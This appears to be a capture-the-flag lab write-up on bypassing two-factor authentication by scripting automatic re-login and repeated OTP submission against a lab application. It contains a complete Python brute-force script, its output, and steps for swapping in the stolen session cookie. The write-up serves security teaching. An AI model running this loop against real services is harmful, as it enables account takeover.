In some applications, failing the 2FA challenge can cause the application to revert the user back to the first part of the authentication process (i.e., the initial login with username and password). This behavior typically occurs due to security mechanisms designed to prevent brute-force attacks on the 2FA part of the application. The application may force the user to reauthenticate to ensure that the person attempting to log in is indeed the legitimate user and not an attacker trying to guess the OTP.

## Common Reasons 
**Session Invalidation**
Upon failing the 2FA challenge, the application might invalidate the user's session as a security measure, forcing the user to start the authentication process from scratch.

**Rate-Limiting and Lockout Policies**
To prevent attackers from repeatedly attempting to bypass 2FA, the application may have rate-limiting or lockout mechanisms in place that trigger after a set number of failed attempts, reverting the user to the initial login step.

**Security-Driven Redirection**
Some applications are designed to redirect users back to the login page after multiple failed 2FA attempts as an additional security measure, ensuring that the user's credentials are revalidated before allowing another 2FA attempt.


## Automation 
Automation makes life easier when attacking these kinds of protection because:

**Speed**
Manually logging back in every time you get logged out is slow and tedious. Automation can do it for you much faster.

**Consistency**
Automation avoids mistakes that might happen if you’re doing the same repetitive actions over and over again. It’s reliable.

**Recovering From Logouts**
If the application logs you out after a few failed attempts, the script can automatically log back in and keep trying. This saves you the hassle of doing it manually every time.

**Customization**
Manually creating an automation script for the attack offers more flexibility than using a single tool like ZAP or Burp Suite. You can customize your scripts to test specific scenarios, such as using different IP addresses or user agents or varying the timing between requests.


## Exploitation
The application hosted in [http://mfa.thm/labs/third](http://mfa.thm/labs/third) automatically logs out the user if they fail the 2FA challenge. For demonstration purposes, the application also generates a 4-digit PIN code every time the user logs in to the application.

**Note:** In real-life applications, the PIN code typically ranges from 0000 to 9999. We're only setting it to a lower value to save time brute-forcing it.
```php
function generateToken()
{
    $token = strval(rand(1250, 1350));

    $_SESSION['token'] = $token;
    return 'success';
}
```

Using the Python script below, save the script as **exploit.py** and run it in your terminal.
```python
import requests

# Define the URLs for the login, 2FA process, and dashboard
login_url = 'http://mfa.thm/labs/third/'
otp_url = 'http://mfa.thm/labs/third/mfa'
dashboard_url = 'http://mfa.thm/labs/third/dashboard'

# Define login credentials
credentials = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

# Define the headers to mimic a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

# Function to check if the response contains the login page
def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

# Function to handle the login process
def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
# Function to handle the 2FA process
def submit_otp(session, otp):
    # Split the OTP into individual digits
    otp_data = {
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3]
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

# Function to check if the response contains the login page
def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

# Function to attempt login and submit the hardcoded OTP until success
def try_until_success():
    otp_str = '1337'  # Hardcoded OTP

    while True:  # Keep trying until success
        session = requests.Session()  # Create a new session object for each attempt
        login_response = login(session)  # Log in before each OTP attempt
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        # Check if the response is the login page (unsuccessful OTP)
        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue  # Retry login and OTP submission

        # Check if the response is a redirect (status code 302)
        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            # Check if it successfully bypassed 2FA and landed on the dashboard
            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()  # Return session cookies after successful bypass
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")

# Start the attack to try until success
try_until_success()
```

### Script breakdown
- **URLs**:
    - `login_url`: The URL for the login page where the user enters their email and password.
    - `otp_url`: The URL where the user submits the 4-digit OTP for verification.
    - `dashboard_url`: The URL of the dashboard that the user is redirected to after successful authentication.
    
- **Credentials**:
    - The `credentials` dictionary holds the email and password that will be used to log in.
    
- **Headers**:
    - The `headers` dictionary contains HTTP headers that mimic a real browser request, including `User-Agent`, `Referer`, `Content-Type`, and others.

**Functions**
- **is_login_successful(response)**:
    - Checks if the login was successful by looking for the phrase "User Verification" in the response text and ensuring the status code is `200 OK`.
    
- **login(session)**:
    - Performs the login by sending a POST request with the user’s credentials to the `login_url`. It returns the server's response.
    
- **submit_otp(session, otp)**:
    - Sends the 4-digit OTP to the `otp_url` in a POST request. The OTP is split into individual digits and sent as separate parameters (`code-1`, `code-2`, etc.). The function returns the server's response.

- **is_login_page(response)**:
    - Checks if the response contains the login page by looking for keywords like "Sign in to your account" or "Login" in the response text.


**Brute-Force Process**
- **OTP Range**:
    - The script loops till the application responds with the same OTP set in the script.
    
- **Session Creation**:
    - For each OTP attempt, a new session is created using `requests.Session()`, ensuring a fresh session for every login and OTP submission attempt.
    
- **Login Attempt**:
    - The script attempts to log in using the provided credentials. If the login is successful, it prints "Logged in successfully" and continues to the OTP submission. If the login fails, the script skips to the next OTP attempt.

- **OTP Submission**:
    - The script formats the OTP as a 4-digit string and sends it to the `otp_url`.

- **Response Handling**:
    - If the server response contains the login page (indicating a failed OTP attempt), the script prints an error message and continues to the next OTP.
    - If the response has a `302 Found` status code (indicating a redirection), it checks the `Location` header:
        - If redirected to `/labs/third/dashboard`, it indicates a successful OTP bypass, and the script prints a success message and exits.
        - If redirected to `/labs/third/` (the login page), it indicates a failed OTP, and the script prints an error message.
        - Any other redirect location is flagged as unexpected, and an error message is printed.
    - If the response has any other status code, the script prints the status code and retries the next OTP.

Output:
```shell-session
user@tryhackme$ $ python3 exploit.py
Logged in successfully.
Trying OTP: 1337
DEBUG: OTP submission response status code: 302
Unsuccessful OTP attempt, redirected to login page. OTP: 1337
Logged in successfully.
Trying OTP: 1337
DEBUG: OTP submission response status code: 302
Unsuccessful OTP attempt, redirected to login page. OTP: 1337
Logged in successfully.
Trying OTP: 1337
DEBUG: OTP submission response status code: 302
Session cookies: {'PHPSESSID': '57burqsvce3odaif2oqtptbl13'}
```

Using the new PHPSESSID, go to [http://mfa.thm/labs/third](http://mfa.thm/labs/third), open your browser's developer tools, and navigate to *Storage > Cookies.* and replace the PHPSESSID value with the PHPSESSID from your terminal --> Login 
	![](Pasted%20image%2020241204185202.png)![](Pasted%20image%2020241204185450.png)